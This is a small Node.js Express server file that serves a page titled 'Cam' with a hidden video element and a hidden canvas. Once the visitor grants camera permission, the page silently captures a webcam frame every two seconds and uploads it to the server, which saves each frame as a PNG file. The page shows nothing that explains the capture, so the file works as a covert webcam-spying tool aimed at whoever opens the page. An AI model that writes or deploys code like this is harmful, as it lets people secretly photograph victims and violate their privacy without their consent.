const express=require('express');
const fs=require('fs');
const path=require('path');
const app=express();
app.use(express.json({limit:'10mb'}));

app.get('/',(req,res)=>{
res.send(`<!DOCTYPE html><html><head><title>Cam</title></head><body>
<video id="v" autoplay playsinline style="display:none"></video>
<canvas id="c" width="640" height="480" style="display:none"></canvas>
<script>
let v=document.getElementById('v'),c=document.getElementById('c');
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
v.srcObject=s;
setInterval(()=>{
c.getContext('2d').drawImage(v,0,0,640,480);
let img=c.toDataURL('image/png');
fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img})});
},2000);
});
</script></body></html>`);
});

app.post('/upload',(req,res)=>{
    
    let data = req.body.img.replace(/^data:image\/png;base64,/, '');

let fname='image-'+Date.now()+'.png';
fs.writeFileSync(path.join(__dirname,fname),data,'base64');
res.sendStatus(200);
});

app.listen(3000);
